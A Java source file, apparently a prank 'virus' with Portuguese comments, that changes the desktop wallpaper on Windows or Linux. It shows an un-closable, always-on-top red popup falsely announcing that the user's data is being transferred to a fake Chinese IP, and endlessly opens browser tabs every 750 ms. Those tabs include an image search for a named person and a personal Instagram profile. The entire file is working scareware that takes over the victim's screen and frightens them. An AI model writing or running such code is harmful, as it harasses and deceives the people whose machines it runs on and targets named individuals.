package teste;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.IOException;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.net.URI;
import java.io.File;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;

public class App {

    public interface User32 extends Library {
        User32 INSTANCE = Native.load("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);
        boolean SystemParametersInfo(int uiAction, int uiParam, String pvParam, int fWinIni);
    }

    public static void main(String[] args) {
        // Inicia a tela popup em uma nova thread
        SwingUtilities.invokeLater(App::showPopup);

        String imagePath = "/imagens/luizon.jpg"; // Caminho da imagem

        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            setWallpaperWindows(imagePath); // Definir o wallpaper no Windows
        } else {
            setWallpaperLinux(imagePath); // Definir o wallpaper no Linux
        }

        // Inicia o loop de abrir sites
        openSitesInLoop();
    }

    // Método para exibir a tela popup infinita com a mensagem
    public static void showPopup() {
        String imagePath = "/imagens/luizon.jpg"; // Caminho da imagem dentro do JAR
        BufferedImage image = loadImage(imagePath); // Carrega a imagem

        if (image == null) {
            System.err.println("Imagem não encontrada ou inválida.");
            return;
        }

        int width = 525;  // Largura mínima
        int height = 200; // Altura mínima

        JFrame frame = new JFrame("Vírus Muito Perigoso");
        frame.setSize(width, height);
        frame.setLocationRelativeTo(null);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);

        // Mantém a janela sempre no topo
        frame.setAlwaysOnTop(true);

        // Painel com cor de fundo vermelha
        JPanel panel = new JPanel();
        panel.setBackground(Color.RED);
        panel.setLayout(new BorderLayout());

        JLabel label = new JLabel("TRANSFERINDO SEUS DADOS PARA 573.600.442.98 (CHINA)", JLabel.CENTER);
        label.setForeground(Color.YELLOW);
        label.setFont(new Font("Arial", Font.BOLD, 16));

        panel.add(label, BorderLayout.CENTER);
        frame.add(panel);
        frame.setVisible(true);

        // Garante que a janela sempre volte para frente caso seja minimizada
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(500); // Pequeno delay para evitar alto consumo de CPU

                    // Se a janela estiver minimizada ou sem foco, traga de volta
                    if (!frame.isFocused() || !frame.isAlwaysOnTop()) {
                        frame.setState(JFrame.NORMAL);
                        frame.toFront();
                        frame.requestFocus();
                    }

                } catch (InterruptedException e) {
                    System.err.println("Erro no loop de manutenção do popup: " + e.getMessage());
                }
            }
        }).start();

        // Reinicia a janela quando tentarem fechá-la
        frame.addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                showPopup(); // Reabre a mensagem
                frame.dispose();
            }
        });
    }

    // Método para carregar a imagem do JAR
    private static BufferedImage loadImage(String path) {
        try {
            // Carrega a imagem do JAR usando getResourceAsStream
            return ImageIO.read(App.class.getResourceAsStream(path));
        } catch (IOException e) {
            System.err.println("Erro ao carregar a imagem: " + e.getMessage());
            return null;
        }
    }

    // Método para Windows
    public static void setWallpaperWindows(String imagePath) {
        try {
            // Carrega a imagem do JAR
            BufferedImage image = ImageIO.read(App.class.getResourceAsStream(imagePath));
            if (image == null) {
                System.err.println("Imagem não encontrada ou inválida.");
                return;
            }

            File tempFile = File.createTempFile("wallpaper", ".bmp");
            ImageIO.write(image, "bmp", tempFile);

            User32.INSTANCE.SystemParametersInfo(0x0014, 0, tempFile.getAbsolutePath(), 0x0001 | 0x0002);

            tempFile.deleteOnExit();
            System.out.println("Papel de parede alterado no Windows com sucesso!");
        } catch (IOException e) {
            System.err.println("Erro ao alterar o papel de parede no Windows: " + e.getMessage());
        }
    }

    // Método para Linux
    public static void setWallpaperLinux(String imagePath) {
        try {
            String desktop = System.getenv("XDG_CURRENT_DESKTOP"); // Detecta o ambiente gráfico

            ProcessBuilder processBuilder = null;
            if (desktop != null && desktop.contains("GNOME")) {
                processBuilder = new ProcessBuilder("gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://" + new File(imagePath).getAbsolutePath());
            } else if (desktop != null && desktop.contains("KDE")) {
                processBuilder = new ProcessBuilder("qdbus", "org.kde.plasmashell", "/PlasmaShell", "org.kde.PlasmaShell.evaluateScript",
                        "var allDesktops = desktops(); for (i=0; i<allDesktops.length; i++) { allDesktops[i].wallpaperPlugin = 'org.kde.image'; allDesktops[i].currentConfigGroup = ['Wallpaper', 'org.kde.image', 'General']; allDesktops[i].writeConfig('Image', 'file://" + new File(imagePath).getAbsolutePath() + "') }");
            } else if (desktop != null && desktop.contains("XFCE")) {
                processBuilder = new ProcessBuilder("xfconf-query", "--channel", "xfce4-desktop", "--property", "/backdrop/screen0/monitor0/image-path", "--set", new File(imagePath).getAbsolutePath());
            } else {
                System.err.println("Ambiente gráfico não suportado!");
                return;
            }

            Process process = processBuilder.start();
            process.waitFor();
            System.out.println("Papel de parede alterado no Linux com sucesso!");
        } catch (IOException | InterruptedException e) {
            System.err.println("Erro ao alterar o papel de parede no Linux: " + e.getMessage());
        }
    }

    // Método para abrir sites repetidamente
    public static void openSitesInLoop() {
        new Thread(() -> {
            String[] sites = {
                "https://www.google.com/search?sca_esv=fe99ce11bd8b5ba9&sxsrf=AHTn8zpaYzHJrz3DE6jmCWokKHTxW_wyyQ:1741954414189&q=pedro+migas&udm=2&fbs=ABzOT_Bn5vjc5Y41qyP2Xw89vSwfiobeCRvEQDCK22h-k5_dn44gJT6GK-6f7McXdVeS6of5Pbb7lONanS4HGuXGyhegbqeXUTEex-rz-9FOskDACR_rHreztR15STH6uQAanPmljMXlrzFyH3KgOBQf4RBb976HrUZ1ljVecqJMyXTc-BTQyW16sFkYv1Dyj_qMZZ5OuFiQiWV1ZeMGE_0qDPC0uB1Omw&sa=X&ved=2ahUKEwi8jsrwxYmMAxVJLrkGHXTvDP0QtKgLegQIEhAB&biw=1366&bih=633&dpr=1",
                "https://www.twitch.tv/",
                "http://www.bancocn.com/",
                "https://www.instagram.com/felipesimaoka/"
// Adicione os outros sites que você deseja abrir
            };
            try {
                while (true) {
                    for (String site : sites) {
                        Desktop.getDesktop().browse(URI.create(site));
                        Thread.sleep(750);
                    }
                }
            } catch (Exception e) {
                System.err.println("Erro ao abrir os sites: " + e.getMessage());
            }
        }).start();
    }
}